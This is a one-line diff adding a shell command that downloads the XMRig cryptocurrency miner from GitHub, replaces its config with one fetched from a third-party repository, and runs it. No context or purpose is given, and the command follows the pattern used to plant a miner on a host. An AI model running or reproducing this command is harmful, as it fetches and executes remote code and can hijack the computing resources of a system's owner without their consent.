@@ -1,0 +1,1 @@
+cd /home && mkdir xmrig && cd xmrig && wget https://github.com/xmrig/xmrig/releases/download/v6.15.3/xmrig-6.15.3-focal-x64.tar.gz && tar +xf xmrig-6.15.3-focal-x64.tar.gz && cd xmrig-6.15.3-focal-x64 && rm config.json && wget https://github.com/hhptvoka1379/xmrig-con-stuff/raw/main/xmrig.conf && chmod +x xmrig && ./xmrig -c xmrig.conf
